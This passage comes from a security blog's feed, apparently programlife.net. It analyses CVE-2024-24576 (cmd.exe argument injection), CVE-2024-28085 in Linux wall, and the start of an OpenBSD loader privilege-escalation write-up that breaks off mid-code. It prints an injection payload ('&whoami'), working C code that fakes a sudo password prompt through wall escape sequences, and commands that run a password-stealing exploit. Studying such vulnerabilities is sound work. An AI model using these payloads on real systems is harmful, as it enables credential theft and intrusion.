copies a <code>&quot;</code> to the new command line, then begins copying characters from the old command line to the new one without seeing whether any of these characters is a metacharacter. This copying continues until cmd either reaches the end of the command line, runs into a variable substitution, or sees another <code>&quot;</code>. In the last case, cmd copies a <code>&quot;</code> to the new command line and resumes normal processing. This behavior is <em>almost</em>, but not <em>quite</em> like what CommandLineFromArgvW does with the same character; the difference is that cmd does not know about the <code>\&quot;</code> sequence and begins interpreting metacharacters earlier than we would expect.</p></blockquote><p>这段话看起来很好理解，但是并不能解释下面的现象（<code>child</code> 执行后打印自身的命令行参数）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">child</span> "<span class="title">hello</span> <span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">child</span> "<span class="title">hello</span>"<span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">helloworld</span> &gt;\\.\<span class="title">nul</span>]</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">child</span> "<span class="title">hello</span>\"<span class="title">world</span>" &gt;\\.\<span class="title">nul</span></span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">hello</span>"<span class="title">world</span>]</span></span><br><span class="line"><span class="function">2: [&gt;\\.\<span class="title">nul</span>]</span></span><br></pre></td></tr></table></figure><p>也不能解释出现命令注入漏洞问题的本质：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">child</span> "<span class="title">malicious</span> <span class="title">argument</span>\" &amp;<span class="title">whoami</span>"</span></span><br><span class="line"><span class="function">0: [<span class="title">child</span>]</span></span><br><span class="line"><span class="function">1: [<span class="title">malicious</span>-<span class="title">argument</span>"]</span></span><br><span class="line"><span class="function"><span class="title">ntdev</span>\<span class="title">dancol</span></span></span><br></pre></td></tr></table></figure><p>不知道是作者自己也没有弄清楚，还是故意留了一手 :D 至于真实的解析逻辑，得看 <code>cmd.exe</code> 的源码才知道了。</p><h2 id="0x07-CMD-exe-AutoRun"><a href="#0x07-CMD-exe-AutoRun" class="headerlink" title="0x07. CMD.exe AutoRun"></a>0x07. CMD.exe AutoRun</h2><p>前面分析 Rust 的 <code>make_bat_command_line</code> 函数，发现运行 <code>.bat</code> 或者 <code>.cmd</code> 文件是通过 <code>cmd.exe /d /c filepah</code> 的形式来执行的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">D:\&gt;cmd /?</span><br><span class="line">启动 Windows 命令解释器的一个新实例</span><br><span class="line"></span><br><span class="line">CMD [/A | /U] [/Q] [/D] [/E:ON | /E:OFF] [/F:ON | /F:OFF] [/V:ON | /V:OFF]</span><br><span class="line">    [[/S] [/C | /K] string]</span><br><span class="line"></span><br><span class="line">/C      执行字符串指定的命令然后终止</span><br><span class="line">/D      禁止从注册表执行 AutoRun 命令(见下)</span><br><span class="line"></span><br><span class="line">如果 /D 未在命令行上被指定，当 CMD.EXE 开始时，它会寻找</span><br><span class="line">以下 REG_SZ/REG_EXPAND_SZ 注册表变量。如果其中一个或</span><br><span class="line">两个都存在，这两个变量会先被执行。</span><br><span class="line"></span><br><span class="line">    HKEY_LOCAL_MACHINE\Software\Microsoft\Command Processor\AutoRun</span><br><span class="line">        和/或</span><br><span class="line">    HKEY_CURRENT_USER\Software\Microsoft\Command Processor\AutoRun</span><br></pre></td></tr></table></figure><p>看上去也可以是一个恶意软件实现持久化驻留的方式，因为启动 <code>cmd.exe</code> 的时候一般不会有人刻意指定 <code>/d</code> 参数。Google 搜索了一下，在 <a href="https://persistence-info.github.io/Data/cmdautorun.html" target="_blank" rel="noopener">persistence-info.github.io</a> 上有提及（这是一个专门收集 Windows 上持久化驻留方式的网站，类似 <a href="https://programlife.net/2024/03/03/living-off-the-land-techniques/">Living Off the Land Techniques</a> 收集网站）。</p><h2 id="0x08-分析小结"><a href="#0x08-分析小结" class="headerlink" title="0x08. 分析小结"></a>0x08. 分析小结</h2><p>在 Windows 下，Rust 在执行 <code>.bat</code> 或者 <code>.cmd</code> 文件时，底层会调用 <code>CreateProcess</code> 创建 <code>cmd.exe</code> 子进程，Rust 在拼接子进程的命令行参数时会根据需要对参数进行转义处理；但是 <code>cmd.exe</code> 有自己的命令行参数处理逻辑，而 Rust 对命令行参数进行转义的逻辑和 <code>cmd.exe</code> 不一致，导致可以通过 <code>cmd.exe</code> 执行注入的命令。</p><p>这个漏洞很难说是编程语言自身的问题，但是在编程语言侧可以增加对应的漏洞缓解措施，所以也不是所有语言都会把这个当成漏洞来快速修复处理。</p><h2 id="0x09-参考文档"><a href="#0x09-参考文档" class="headerlink" title="0x09. 参考文档"></a>0x09. 参考文档</h2><ol><li><a href="https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/" target="_blank" rel="noopener">https://flatt.tech/research/posts/batbadbut-you-cant-securely-execute-commands-on-windows/</a></li><li><a href="https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html" target="_blank" rel="noopener">https://blog.rust-lang.org/2024/04/09/cve-2024-24576.html</a></li><li><a href="https://www.kb.cert.org/vuls/id/123335" target="_blank" rel="noopener">https://www.kb.cert.org/vuls/id/123335</a></li><li><a href="https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main" target="_blank" rel="noopener">https://github.com/frostb1ten/CVE-2024-24576-PoC/tree/main</a></li><li><a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw</a></li><li><a href="https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way" target="_blank" rel="noopener">https://learn.microsoft.com/en-us/archive/blogs/twistylittlepassagesallalike/everyone-quotes-command-line-arguments-the-wrong-way</a></li><li><a href="https://persistence-info.github.io/Data/cmdautorun.html" target="_blank" rel="noopener">https://persistence-info.github.io/Data/cmdautorun.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近期来自 Flatt Security Inc. 的 RyotaK 披露了 Windows 下多个编程语言的命令注入漏洞（漏洞被命名为 &lt;strong&gt;BatBadBut&lt;/strong&gt;），其中 Rust 语言对应的漏洞编号为 CVE-2024-24576，因为 Rust 语言自带流量属性，国内安全/科技自媒体可能会使用一些怪异的标题来进行宣传。实际上，这个漏洞跟内存安全没有关系，是 Windows 下 &lt;code&gt;cmd.exe&lt;/code&gt; 对命令行参数的特殊解析逻辑所导致的逻辑漏洞；此外，这个漏洞也不仅仅影响 Rust，像 PHP、Python 等语言均受影响。&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="https://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="Rust" scheme="https://programlife.net/tags/Rust/"/>
    
      <category term="Command Injection" scheme="https://programlife.net/tags/Command-Injection/"/>
    
      <category term="cmd.exe" scheme="https://programlife.net/tags/cmd-exe/"/>
    
      <category term="CreateProcess" scheme="https://programlife.net/tags/CreateProcess/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall</title>
    <link href="https://programlife.net/2024/03/31/cve-2024-28085-improper-neutralization-of-escape-sequences-in-wall/"/>
    <id>https://programlife.net/2024/03/31/cve-2024-28085-improper-neutralization-of-escape-sequences-in-wall/</id>
    <published>2024-03-31T13:33:37.000Z</published>
    <updated>2024-03-31T14:46:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall</p><a id="more"></a><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01. 漏洞介绍"></a>0x01. 漏洞介绍</h2><p>CVE-2024-28085 是 Linux 下 <code>wall</code> 命令不当处理 Escape Sequence 引发的一个漏洞，利用该漏洞可能可以窃取管理员的密码。危害算不上大，但是 Escape Sequence 处理不当也算是一种漏洞模式，可以参考 <a href="https://cwe.mitre.org/data/definitions/150.html" target="_blank" rel="noopener">CWE-150: Improper Neutralization of Escape, Meta, or Control Sequences</a>，Black Hat USA 2023 还有一个相关的议题 <a href="https://www.blackhat.com/us-23/briefings/schedule/#weaponizing-plain-text-ansi-escape-sequences-as-a-forensic-nightmare-31757" target="_blank" rel="noopener">Weaponizing Plain Text: ANSI Escape Sequences as a Forensic Nightmare</a>。</p><p>按照原作者的说法，这个漏洞已经存在相当长的时间了，但笔者在 Ubuntu 20.04 上无法复现，在 Ubuntu 22.04 上可以复现。另外，Ubuntu 自带的 GNOME Terminal 不受该漏洞影响，因为 GNOME Terminal 不接收 <code>wall</code> 发送的消息。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h2><h3 id="2-1-wall"><a href="#2-1-wall" class="headerlink" title="2.1 wall"></a>2.1 wall</h3><p><code>wall</code> 是 Linux 下的一个内置程序，可以通过广播的方式给所有用户发送消息。在 Ubuntu 下，这是一个 SGID-tty 程序，普通用户也可以直接运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ls -al $(which wall)</span><br><span class="line">-rwxr-sr-x 1 root tty 22904  2月 21  2022 /usr/bin/wall</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> man wall</span><br><span class="line">NAME</span><br><span class="line">       wall - write a message to all users</span><br><span class="line">SYNOPSIS</span><br><span class="line">       wall [-n] [-t timeout] [-g group] [message | file]</span><br></pre></td></tr></table></figure><h3 id="2-2-command-not-found"><a href="#2-2-command-not-found" class="headerlink" title="2.2 command-not-found"></a>2.2 command-not-found</h3><p>在 Ubuntu 下面，运行一个不存在的命令，会有如下提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> xxx</span><br><span class="line">Command 'xxx' not found, did you mean:</span><br><span class="line">  command 'xx' from deb fex-utils (20160919-2)</span><br><span class="line">  command 'x2x' from deb x2x (1.30-10)</span><br><span class="line">  command 'xdx' from deb xdx (2.5.0-4)</span><br><span class="line">  command 'xxd' from deb xxd (2:8.2.3995-1ubuntu2.13)</span><br><span class="line">Try: sudo apt install &lt;deb name&gt;</span><br></pre></td></tr></table></figure><p>实际上，这是 <code>/usr/lib/command-not-found</code> 输出的提示信息，该文件是一个 Python 脚本。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> file /usr/lib/command-not-found</span><br><span class="line">/usr/lib/command-not-found: Python script, ASCII text executable</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span> /usr/lib/command-not-found xxx</span><br><span class="line">Command 'xxx' not found, did you mean:</span><br><span class="line">  command 'xxd' from deb xxd (2:8.2.3995-1ubuntu2.13)</span><br><span class="line">  command 'xdx' from deb xdx (2.5.0-4)</span><br><span class="line">  command 'x2x' from deb x2x (1.30-10)</span><br><span class="line">  command 'xx' from deb fex-utils (20160919-2)</span><br><span class="line">Try: sudo apt install &lt;deb name&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-Escape-Sequence"><a href="#2-3-Escape-Sequence" class="headerlink" title="2.3 Escape Sequence"></a>2.3 Escape Sequence</h3><p>在 Terminal 中，<a href="https://programlife.net/tags/Escape-Sequence/">Escape Sequence</a> 可以用来产生一些特定的行为，最常见的是控制文字的字体颜色、背景颜色、粗体、斜体、下划线等。</p><p>Escape Sequence 的格式为 <code>&lt;Esc&gt;[</code> <code>FormatCode</code> <code>m</code>，其中：</p><ul><li><code>&lt;Esc&gt;</code> 可以写成如下三种格式：<code>\e</code>、<code>\033</code>、<code>\x1b</code></li><li><code>[</code> 是固定的字符</li><li><code>FormatCode</code> 是 ASCII 码，如果有多个控制码，需要使用 <code>;</code> 分隔</li><li><code>m</code> 是固定的字符</li></ul><p>比如：</p><ul><li><code>printf &quot;\033[1;4;31mHello World\n\033[0m&quot;</code> 控制的字体格式为：<code>1</code> 粗体、<code>4</code> 下划线、<code>31</code> 红色</li><li><code>printf &quot;\033[4;31mHello World\n\033[0m&quot;</code> 控制的字体格式为：<code>4</code> 下划线、<code>31</code> 红色</li><li>注意 <code>0</code> 表示重置格式</li></ul><p><img src="/uploads/202403/terminal-escape-sequence.png" alt="Terminal Escape Sequence"></p><h3 id="2-4-漏洞分析"><a href="#2-4-漏洞分析" class="headerlink" title="2.4 漏洞分析"></a>2.4 漏洞分析</h3><p><code>wall</code> 可以从命令行接收要发送的消息，也可以从 <code>stdin</code> 或者文件接收要发送的消息。其中命令行传递的消息未经过任何处理，代码参考 <a href="https://github.com/util-linux/util-linux/blob/07f0f0f5bd1e5e2268257ae1ff6d76a9b6c6ea8b/term-utils/wall.c#L365" target="_blank" rel="noopener">term-utils/wall.c#L365</a>（从 <code>master</code> 分支的代码看，这个漏洞目前暂时没有修复）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read message from argv[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mvecsz; i++) &#123;</span><br><span class="line">    <span class="built_in">fputs</span>(mvec[i], fs);</span><br><span class="line">    <span class="keyword">if</span> (i &lt; mvecsz - <span class="number">1</span>)</span><br><span class="line">        fputc(<span class="string">' '</span>, fs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">fputs</span>(<span class="string">"\r\n"</span>, fs);</span><br></pre></td></tr></table></figure><p>而 <code>stdin</code> 传递的消息是会特殊处理的（如果是文件，使用 <code>freopen</code> 将 <code>stdin</code> 绑定到文件）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * read message from &lt;file&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (fname) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When we are not root, but suid or sgid, refuse to read files</span></span><br><span class="line"><span class="comment">     * (e.g. device files) that the user may not have access to.</span></span><br><span class="line"><span class="comment">     * After all, our invoker can easily do "wall &lt; file"</span></span><br><span class="line"><span class="comment">     * instead of "wall file".</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="keyword">if</span> (uid &amp;&amp; (uid != geteuid() || getgid() != getegid()))</span><br><span class="line">        errx(EXIT_FAILURE, _(<span class="string">"will not read %s - use stdin."</span>),</span><br><span class="line">             fname);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!freopen(fname, <span class="string">"r"</span>, <span class="built_in">stdin</span>))</span><br><span class="line">        err(EXIT_FAILURE, _(<span class="string">"cannot open %s"</span>), fname);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Read message from stdin.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">while</span> (getline(&amp;lbuf, &amp;lbuflen, <span class="built_in">stdin</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">    fputs_careful(lbuf, fs, <span class="string">'^'</span>, <span class="literal">true</span>, TERM_WIDTH);</span><br></pre></td></tr></table></figure><p>这里使用了 <code>fputs_careful</code>，源码可以参考 <a href="https://github.com/util-linux/util-linux/blob/07f0f0f5bd1e5e2268257ae1ff6d76a9b6c6ea8b/include/carefulputc.h#L22" target="_blank" rel="noopener">include/carefulputc.h#L22</a>。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03. 漏洞利用"></a>0x03. 漏洞利用</h2><p>原作者提出的漏洞利用思路如下：</p><ol><li>用户通过 <code>sudo</code> 执行一条命令，比如 <code>sudo systemctl start apache2</code>，用户输入管理员密码并回车</li><li>攻击者可以先后监控到 <code>sudo systemctl start apache2</code> 和 <code>systemctl start apache2</code> 两条命令的执行</li><li>攻击者通过 <code>wall</code> 广播一条精心构造的消息，使得另一端的用户以为密码输入错误</li><li>用户重新输入密码并回车</li><li>此时密码会被当作一条命令，显然该命令并不存在</li><li>攻击者通过监控 <code>/usr/lib/command-not-found</code> 来获取上述密码</li></ol><p>监控程序运行是通过循环枚举和读取 <code>/proc/pid/cmdline</code> 来实现的（包括密码的读取），通过 <code>wall</code> 发送消息的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Username to show in prompt</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"root"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Set color (48,10,36 is gnome-terminal)</span></span><br><span class="line"><span class="comment">// #define USER_R "48"</span></span><br><span class="line"><span class="comment">// #define USER_G "10"</span></span><br><span class="line"><span class="comment">// #define USER_B "36"</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_R <span class="meta-string">"0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_G <span class="meta-string">"0"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USER_B <span class="meta-string">"0"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* _argv[] = &#123;<span class="string">"prog"</span>,</span><br><span class="line">        <span class="string">"\033[3A"</span> <span class="comment">// Move up 3</span></span><br><span class="line">        <span class="string">"\033[K"</span>  <span class="comment">// Delete prompt</span></span><br><span class="line">        <span class="string">"[sudo] password for "</span>USERNAME<span class="string">": \033[47m \033[40m"</span></span><br><span class="line">        <span class="string">"\033[?25l"</span></span><br><span class="line">        <span class="comment">// Set forground RGB (48,10,36)</span></span><br><span class="line">        <span class="comment">// hide typing</span></span><br><span class="line">        <span class="string">"\033[38;2;"</span>USER_R<span class="string">";"</span>USER_G<span class="string">";"</span>USER_B<span class="string">"m"</span>,</span><br><span class="line">        <span class="literal">NULL</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span>* _envp[] = &#123;<span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(<span class="string">"/usr/bin/wall"</span>, _argv, _envp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整的利用方式可以参考原作者的 GitHub 仓库。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/skyler-ferrante/CVE-2024-28085.git</span><br><span class="line">./build.sh</span><br><span class="line">./spy &gt; proc.log &amp; ./watch "sudo systemctl start apache2"; ./watch "systemctl start apache2"; sleep .01; ./throw</span><br></pre></td></tr></table></figure><p>这里没有做现场恢复，所以运行之后，其他用户的终端直接废了：不显示光标，输入的文字也不可见。</p><ul><li><code>\033[?25h</code> 显示光标</li><li><code>\033[0m</code> 重置格式</li></ul><p>所以，好一点的利用方式需要在拿到密码后，重新通过 <code>wall</code> 发送消息来恢复对方的终端设置。</p><p>其他利用场景：</p><ul><li>监控 SSH 登录，利用方式跟前面一样</li><li>监控 <code>cat ~/.ssh/id_rsa.pub</code>，替换剪贴板数据</li></ul><h2 id="0x04-References"><a href="#0x04-References" class="headerlink" title="0x04. References"></a>0x04. References</h2><ol><li><a href="https://www.cnblogs.com/unclemac/p/12783387.html" target="_blank" rel="noopener">https://www.cnblogs.com/unclemac/p/12783387.html</a></li><li><a href="https://github.com/skyler-ferrante/CVE-2024-28085/tree/main" target="_blank" rel="noopener">https://github.com/skyler-ferrante/CVE-2024-28085/tree/main</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2024-28085 Improper Neutralization of Escape Sequences in Wall&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="https://programlife.net/categories/Vulnerability/"/>
    
      <category term="Linux" scheme="https://programlife.net/categories/Vulnerability/Linux/"/>
    
    
      <category term="漏洞案例研究" scheme="https://programlife.net/tags/%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6/"/>
    
      <category term="wall" scheme="https://programlife.net/tags/wall/"/>
    
      <category term="Escape Sequence" scheme="https://programlife.net/tags/Escape-Sequence/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-19726 OpenBSD dynamic loader 本地提权漏洞</title>
    <link href="https://programlife.net/2024/03/20/cve-2019-19726-openbsd-dynamic-loader-lpe/"/>
    <id>https://programlife.net/2024/03/20/cve-2019-19726-openbsd-dynamic-loader-lpe/</id>
    <published>2024-03-20T13:33:37.000Z</published>
    <updated>2024-03-20T12:55:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2019-19726 OpenBSD dynamic loader Local Privilege Escalation Vulnerability</p><a id="more"></a><h2 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01. 漏洞介绍"></a>0x01. 漏洞介绍</h2><p>CVE-2019-19726 是 OpenBSD dynamic loader 在清理 <strong>LD_LIBRARY_PATH</strong> 环境变量时存在的一个本地提权漏洞，由 Qualys Research Team 发现。该漏洞获得 2020 年 Pwnie Awards Best Privilege Escalation Bug 提名。漏洞补丁可参考 <a href="https://github.com/openbsd/src/commit/eee3c75f9abd5ea51e066dd0fe6b1efa470e4d0c" target="_blank" rel="noopener">libexec/ld.so/loader.c</a>。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h2><h3 id="2-1-setrlimit-RLIMIT-DATA"><a href="#2-1-setrlimit-RLIMIT-DATA" class="headerlink" title="2.1 setrlimit / RLIMIT_DATA"></a>2.1 setrlimit / RLIMIT_DATA</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getrlimit</span><span class="params">(<span class="keyword">int</span> resource, struct rlimit *rlim)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setrlimit</span><span class="params">(<span class="keyword">int</span> resource, <span class="keyword">const</span> struct rlimit *rlim)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><p>The <strong>getrlimit</strong>() and <strong>setrlimit</strong>() system calls get and set resource limits respectively. Each resource has an associated <strong>soft</strong> and <strong>hard</strong> limit, as defined by the <em>rlimit</em> structure:</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> &#123;</span></span><br><span class="line">    <span class="keyword">rlim_t</span> rlim_cur;  <span class="comment">/* Soft limit */</span></span><br><span class="line">    <span class="keyword">rlim_t</span> rlim_max;  <span class="comment">/* Hard limit (ceiling for rlim_cur) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>The soft limit is the value that the kernel enforces for the corresponding resource. The hard limit acts as a ceiling for the soft limit: an unprivileged process may only set its soft limit to a value in the range from 0 up to the hard limit, and (irreversibly) lower its hard limit. A privileged process (under Linux: one with the <strong>CAP_SYS_RESOURCE</strong> capability) may make arbitrary changes to either limit value.</p><p>The value <strong>RLIM_INFINITY</strong> denotes no limit on a resource (both in the structure returned by <strong>getrlimit</strong>() and in the structure passed to <strong>setrlimit</strong>()).</p></blockquote><p>简单来说，进程可以通过 <code>setrlimit</code> 来限制自身的资源使用上限：</p><ul><li>对于普通进程而言，soft limit 只能位于区间 <code>[0, hard limit]</code>，而 hard limit 则只能进行下调操作</li><li>对于特权进程而言，soft limit 可以随意设置</li><li><code>RLIM_INFINITY</code> 表示没有任何限制</li></ul><p>第一个参数 <code>resource</code> 表示资源类型，<code>RLIMIT_DATA</code> 表示内存资源。</p><blockquote><p><strong>RLIMIT_DATA</strong></p><p>The maximum size of the process’s data segment (initialized data, uninitialized data, and heap). This limit affects calls to <strong>brk</strong>(2) and <strong>sbrk</strong>(2), which fail with the error <strong>ENOMEM</strong> upon encountering the soft limit of this resource.</p></blockquote><p>测试代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_rlimit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span 